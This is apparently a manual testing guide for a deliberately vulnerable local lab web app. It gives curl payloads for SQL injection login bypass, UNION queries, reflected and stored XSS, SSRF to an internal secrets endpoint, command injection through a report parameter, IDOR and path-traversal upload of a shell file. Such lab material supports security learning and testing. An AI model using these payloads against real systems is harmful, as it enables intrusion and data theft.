# Retro Arcade Labs - Manual Testing Guide

## SQL Injection Testing

### Login Bypass
```bash
curl -X POST http://localhost:8470/api/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' --","password":"foo"}'
```

### Search SQLi
```bash
curl "http://localhost:8470/api/products/search.php?q=a'%20UNION%20SELECT%201,2,3,4,5,6,7,8--"
```

## XSS Testing

### Reflected XSS
```bash
curl "http://localhost:8470/api/products/search.php?q=<script>alert('XSS')</script>"
```

### Stored XSS
```bash
curl -X POST http://localhost:8470/api/comments/ \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"body":"<script>alert(1)</script>"}'
```

## SSRF Testing

```bash
curl "http://localhost:8470/api/tools/image-fetch.php?url=http://internal-metadata:8081/api/secrets"
```

## RCE Testing

```bash
curl "http://localhost:8470/api/tools/report.php?type=test;cat+/etc/hostname"
```

## IDOR Testing

```bash
# As user1, view order 1001 (belongs to user2)
curl "http://localhost:8470/api/orders/view.php?id=1001" -b "PHPSESSID=..."
```

## File Upload Testing

```bash
# Path traversal
curl -X POST http://localhost:8470/api/upload/avatar.php \
  -F "avatar=@/tmp/test.txt;filename=../uploads/shell.php"
```
